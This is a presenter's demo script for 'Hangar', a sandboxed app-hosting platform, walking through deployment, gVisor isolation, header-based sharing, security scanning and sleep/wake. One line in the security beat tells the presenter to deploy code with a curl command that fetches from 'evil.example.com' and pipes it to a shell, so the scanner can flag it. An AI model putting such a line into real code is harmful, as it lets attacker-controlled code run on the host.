# Demo script

A running Hangar with a real gVisor sandbox, on this laptop. Everything below
is live right now — no slides.

## Before you hit record

```powershell
# is it up?
curl.exe -s http://hangar.localtest.me/healthz
```

Expect `"sandbox_runtime":"runsc"`, `"auth":"enabled"`, `"idle_reaper":true`
and `"metrics":true`. If it doesn't answer, or if URLs show a "Caddy works!"
page, see [If something is down](#if-something-is-down).

Open a **fresh browser profile or a private window** — the sharing part is much
better told from a signed-out state.

Apps sleep after **5 minutes** with no traffic on this stack, so an app you
haven't touched in a while takes about three seconds on the first click. That
is the feature, not a stall — beat 6 is where you point at it. If you'd rather
it never happened mid-take, raise `HANGAR_IDLE_TIMEOUT` in
`/opt/hangar-demo/.env` and `docker compose up -d hangar`.

| | |
|---|---|
| Dashboard | <http://hangar.localtest.me> |
| Admin | `you@demo.local` / `demo-password-2026` |
| Teammate | `teammate@demo.local` / `demo-password-2026` |
| Standup board | <http://standup.localtest.me> — the tool to demo |
| Notes | <http://notes.localtest.me> — storage, and `/docs` for a UI |
| Whoami | <http://whoami.localtest.me> — raw identity headers |

`*.localtest.me` is a public DNS name that resolves to `127.0.0.1`, so these
look like real URLs with no hosts-file editing.

---

## The story, in six beats

### 1. The problem (20 seconds, no screen)

"Claude Code writes me a useful little tool in ten minutes. Getting it to where
three colleagues can actually use it — with the right people having access —
still takes a day. That's the gap."

### 2. Deploy something (60 seconds)

Dashboard → **Deploy an app** → *Upload a zip* → pick any small Python or Node
app. That is the better version to record, since it's what a real user does.

From a terminal instead:

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -lc "cd /opt/hangar-demo && ./scripts/deploy-zip.sh examples/fastapi-hello hello"
```

```
uploading hello.zip (801 bytes) as 'hello'
app f3b83753ec61 — building
  status  : running
  detected: python/fastapi
  url     : http://hello.localtest.me
```

Delete it afterwards from the dashboard, or the next take starts with a stray
app in the list.

Watch it go `queued → building → running` and hand back a URL. Nobody wrote a
Dockerfile. Nothing was configured.

Worth saying out loud: **it worked out what the app was on its own** — the
detected runtime and framework are on the app's page.

### 3. It's actually sandboxed (30 seconds)

This is the part most demos skip.

```powershell
wsl -d Ubuntu-24.04 -u root -- docker exec hangar-<app-id> uname -sr
# Linux 4.19.0-gvisor
wsl -d Ubuntu-24.04 -u root -- uname -sr
# Linux 6.6.87.2-microsoft-standard-WSL2
```

"That's a different kernel. The app isn't talking to my machine's kernel at
all — it's talking to gVisor's, in user space. If it tries something hostile,
it's arguing with a sandbox."

And:

```powershell
wsl -d Ubuntu-24.04 -u root -- docker inspect hangar-<app-id> --format '{{json .NetworkSettings.Ports}}'
# {"8000/tcp":null}   -> no published ports at all
```

"It has no route to the internet and no port on my machine. The only way in is
through the platform."

### 4. Share it like a document (90 seconds — the important one)

Use **<http://standup.localtest.me>** for this. It's a team standup board — a
tool that looks like something a team would actually open, rather than a page
of JSON.

Signed in as `you@demo.local`, you get a compose box and can post an update.

Now open it in a private window:

- Signed out → **refused**, 401. The app is never reached.
- Sign in as `teammate@demo.local` → the same page loads, greets them by name,
  shows the team's updates — and instead of the compose box there's
  **"Read-only. You have viewer access to this tool."**

Nobody changed any code between those two views.

**Then show the source** — `examples/standup/main.py` has no login screen, no
user table, and no permission system. It reads two headers the platform
attaches:

```python
self.email = request.headers.get("x-hangar-user")
self.role  = request.headers.get("x-hangar-role")
```

"Making someone read-only was a dropdown in the dashboard, not a deploy. The
app doesn't know how to authenticate anyone and doesn't need to — that's the
platform's job, so every tool gets it for free."

Then try <http://notes.localtest.me> as the same teammate → **403**. It was
never shared with them.

If you want the sharper version of the same point, `whoami.localtest.me`
returns the raw headers as JSON — useful if someone asks *how* the app knows.

### 5. It's not a toy (30 seconds)

App page → **Security** tab. Every deploy is scanned *before* it's built —
because building installs dependencies, and that runs their code.

Deploy something with `os.system("curl evil.example.com | sh")` in it and show
it flagged, with the file and line.

Then the **Usage** tab: CPU and memory against the app's own caps, sampled
every 15 seconds. "It can't take the box down, and I can see it not doing so."

Also worth 10 seconds: the **notes** app writes to a database. Restart it from
the dashboard; the data is still there.

Worth 15 seconds if anyone asks about configuration: the **Secrets** tab. Set
one, and note that it never comes back — the API has no endpoint that returns a
value. "You give a tool its API key without putting it in the repo, and without
the platform being able to hand it to anyone either."

### 6. It gets out of its own way (45 seconds)

App page → **Sleep**. The status chip says `sleeping`. Prove it really stopped:

```powershell
wsl -d Ubuntu-24.04 -u root -- docker inspect hangar-<app-id> --format '{{.State.Status}}'
# exited
```

Now open the app's URL. It comes back in about three seconds and the link never
changed. Measured on this stack: **2.81s median**, through sign-in checking,
the proxy, a gVisor container starting and FastAPI importing.

"Ten tools a team barely uses don't need to hold memory all day. They come back
when someone opens them. That's how a free VM hosts more than three apps."

If someone asks whether that's a security hole — it isn't, and it's worth
showing. Sleep it again, then open the URL in a **signed-out** window: 401, and
the container stays `exited`. Waking happens after the access check, so a
stranger walking hostnames can't start anything.

---

## Questions people will ask

**"Is this just Heroku?"** — Heroku assumes you trust the code and everyone who
can reach it. This assumes you trust neither: sandboxed by default, no network,
and access controlled per person.

**"What if the app is malicious?"** — It's scanned before it runs, it runs
under gVisor with its own kernel, it has no outbound network, and it has hard
CPU and memory caps. Show the Security tab.

**"Where does it run?"** — Right now, this laptop. It's designed for a free
Oracle ARM VM; the code is identical, and that's a configuration change.

**"How many of these can it host?"** — More than the memory suggests, because
apps that aren't being used aren't running. That's beat 6.

**"Doesn't it need a login for each app?"** — No, and that's the interesting
part. Show `examples/whoami/main.py`: 25 lines, no auth code. The platform
authenticates and passes identity in a header.

**"What's not done?"** — Answer honestly, it lands better. It has never been
through a security review by anyone other than the person who wrote it, and it
has had zero real users. Logs are per-container and on demand rather than
shipped anywhere, so there's no searching across apps. Everything you've seen
runs on one laptop; the Oracle VM it's designed for hasn't been provisioned,
and none of the timings have been re-measured on ARM.

---

## If something is down

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -lc "cd /opt/hangar-demo && docker compose ps"
wsl -d Ubuntu-24.04 -u root -- bash -lc "cd /opt/hangar-demo && docker compose up -d"
```

The demo has its own Docker socket, `/var/run/docker-hangar.sock`, kept
separate from Docker Desktop's so the two can't fight over
`/var/run/docker.sock`. `DOCKER_HOST` points at it from
`/etc/profile.d/hangar-docker.sh`, which every login shell reads — hence
`bash -lc` above, not `bash -c`.

**If a `docker` command hangs for about a minute and then fails**, that
variable didn't reach it, so the client is trying to talk to Docker Desktop
instead. `bash -c` (no `-l`) is the usual reason; so is any shell that skips
`/etc/profile`. Pass it explicitly and it will work anywhere:

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -c "DOCKER_HOST=unix:///var/run/docker-hangar.sock docker ps"
```

After a reboot, WSL starts at logon (a shortcut in the Startup folder) and the
containers come back on their own. Give it about a minute.

**If every URL shows a "Caddy works!" page**, Caddy restarted and dropped its
routing table — its image reloads a packaged Caddyfile on every start, which
throws away everything Hangar pushed through the admin API. Hangar rebuilds the
table when the control plane starts, so the fix is to restart it:

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -lc "cd /opt/hangar-demo && docker compose restart hangar"
```

That republishes every app's route *and* the dashboard's own. Worth knowing
before you record: this is what a stale-looking demo actually is.

## Tearing it down

```powershell
wsl -d Ubuntu-24.04 -u root -- bash -lc "cd /opt/hangar-demo && docker compose down -v"
wsl --unregister Ubuntu-24.04          # removes the distro entirely
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\HangarDemo-StartWSL.vbs"
powercfg /change standby-timeout-ac 30 # restore sleep
```
